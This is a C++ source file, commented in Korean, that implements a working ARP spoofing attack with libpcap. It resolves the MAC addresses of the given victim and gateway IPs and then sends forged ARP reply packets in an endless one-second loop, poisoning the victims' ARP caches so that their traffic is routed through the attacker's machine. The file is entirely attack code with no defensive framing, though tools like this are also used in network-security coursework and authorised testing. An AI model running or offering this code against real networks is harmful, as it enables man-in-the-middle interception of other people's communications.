#include <iostream>
#include <pcap.h>
#include <cstring>
#include <netinet/ether.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <cstdio>
#include <cstdlib>
#include <sys/socket.h>
#include <netinet/in.h>
#include <net/if_arp.h>
#include <vector>
#include <array>

// ARP 헤더 구조체 정의
struct arp_header {
    uint16_t htype;     // Hardware Type
    uint16_t ptype;     // Protocol Type
    uint8_t hlen;       // Hardware Address Length
    uint8_t plen;       // Protocol Address Length
    uint16_t oper;      // Operation Code
    std::array<uint8_t, 6> sha;     // Sender hardware address
    std::array<uint8_t, 4> spa;     // Sender IP address
    std::array<uint8_t, 6> tha;     // Target hardware address
    std::array<uint8_t, 4> tpa;     // Target IP address
};

// 이더넷 헤더 구조체 정의
struct my_ether_header {
    std::array<uint8_t, 6> dest;    // Destination MAC address
    std::array<uint8_t, 6> src;     // Source MAC address
    uint16_t type;      // EtherType (ARP: 0x0806)
};

// MAC 주소를 가져오는 함수
void get_mac_address(const char* iface, std::array<uint8_t, 6>& mac) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        perror("socket");
        exit(1);
    }

    struct ifreq ifr;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ);
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) == -1) {
        perror("ioctl");
        close(fd);
        exit(1);
    }

    std::memcpy(mac.data(), ifr.ifr_hwaddr.sa_data, 6);
    close(fd);
}

// ARP 패킷을 전송하는 함수
void send_arp_packet(pcap_t* handle, const std::array<uint8_t, 6>& sender_mac, const std::array<uint8_t, 4>& sender_ip, const std::array<uint8_t, 6>& target_mac, const std::array<uint8_t, 4>& target_ip, const std::array<uint8_t, 6>& attacker_mac) {
    uint8_t packet[42];

    struct my_ether_header* eth = (struct my_ether_header*)packet;
    struct arp_header* arp = (struct arp_header*)(packet + 14);

    // 이더넷 헤더 설정
    std::memcpy(eth->dest.data(), sender_mac.data(), 6);
    std::memcpy(eth->src.data(), attacker_mac.data(), 6);
    eth->type = htons(0x0806); // ARP

    // ARP 헤더 설정
    arp->htype = htons(1);   // Ethernet
    arp->ptype = htons(0x0800); // IPv4
    arp->hlen = 6;           // MAC 주소 길이
    arp->plen = 4;           // IP 주소 길이
    arp->oper = htons(2);    // ARP Reply

    std::memcpy(arp->sha.data(), attacker_mac.data(), 6);   // Attacker's MAC
    std::memcpy(arp->spa.data(), target_ip.data(), 4);      // Target IP (Gateway IP)
    std::memcpy(arp->tha.data(), sender_mac.data(), 6);     // Victim's MAC
    std::memcpy(arp->tpa.data(), sender_ip.data(), 4);      // Victim's IP

    // 패킷 전송
    if (pcap_sendpacket(handle, packet, sizeof(packet)) != 0) {
        std::cerr << "Error sending ARP packet: " << pcap_geterr(handle) << std::endl;
    }
}

void GetMACAddress(const char* ipAddress, std::array<uint8_t, 6>& mac, const char* dev) {
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("socket");
        return;
    }

    struct sockaddr_in addr;
    struct arpreq req;

    std::memset(&req, 0, sizeof(req));
    std::memset(&addr, 0, sizeof(addr));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(ipAddress);
    std::memcpy(&req.arp_pa, &addr, sizeof(addr));

    // 네트워크 인터페이스 이름을 dev 인자로 받음
    strncpy(req.arp_dev, dev, IFNAMSIZ - 1);
    req.arp_dev[IFNAMSIZ - 1] = '\0'; // 안전하게 문자열 종료

    if (ioctl(sockfd, SIOCGARP, &req) == -1) {
        perror("ioctl");
        close(sockfd);
        return;
    }

    // MAC 주소를 mac 배열에 복사
    std::memcpy(mac.data(), req.arp_ha.sa_data, 6);

    close(sockfd);
}

int main(int argc, char* argv[]) {
    if (argc < 5 || (argc % 2) != 1) {
        std::cerr << "Usage: " << argv[0] << " <interface> <sender IP 1> <target IP 1> [<sender IP 2> <target IP 2> ...]" << std::endl;
        return 1;
    }

    const char* dev = argv[1];
    
    std::vector<std::array<uint8_t, 4>> sender_ips;
    std::vector<std::array<uint8_t, 4>> target_ips;
    std::vector<std::array<uint8_t, 6>> sender_macs;
    std::vector<std::array<uint8_t, 6>> target_macs;

    std::array<uint8_t, 6> attacker_mac;

    // MAC 주소를 가져옴
    get_mac_address(dev, attacker_mac);

    // 각 IP와 MAC 주소를 가져옴
    for (int i = 2; i < argc; i += 2) {
        std::array<uint8_t, 4> sender_ip;
        std::array<uint8_t, 4> target_ip;
        std::array<uint8_t, 6> sender_mac;
        std::array<uint8_t, 6> target_mac;

        inet_pton(AF_INET, argv[i], sender_ip.data());
        inet_pton(AF_INET, argv[i+1], target_ip.data());

        GetMACAddress(argv[i], sender_mac, dev);
        GetMACAddress(argv[i+1], target_mac, dev);

        sender_ips.push_back(sender_ip);
        target_ips.push_back(target_ip);
        sender_macs.push_back(sender_mac);
        target_macs.push_back(target_mac);
    }

    // pcap 세션 열기
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        std::cerr << "pcap_open_live() failed: " << errbuf << std::endl;
        return 1;
    }

    // ARP 스푸핑 패킷을 지속적으로 전송
    while (true) {
        for (size_t i = 0; i < sender_ips.size(); ++i) {
            send_arp_packet(handle, sender_macs[i], sender_ips[i], target_macs[i], target_ips[i], attacker_mac);
            printf("%02x:%02x:%02x:%02x:%02x:%02x -> %02x:%02x:%02x:%02x:%02x:%02x via %02x:%02x:%02x:%02x:%02x:%02x\n", 
                   sender_macs[i][0], sender_macs[i][1], sender_macs[i][2], sender_macs[i][3], sender_macs[i][4], sender_macs[i][5],
                   target_macs[i][0], target_macs[i][1], target_macs[i][2], target_macs[i][3], target_macs[i][4], target_macs[i][5],
                   attacker_mac[0], attacker_mac[1], attacker_mac[2], attacker_mac[3], attacker_mac[4], attacker_mac[5]);
        }
        printf("sending ARP spoofing packets...\n");
        sleep(1); // 1초마다 패킷 전송
    }

    pcap_close(handle);
    return 0;
}
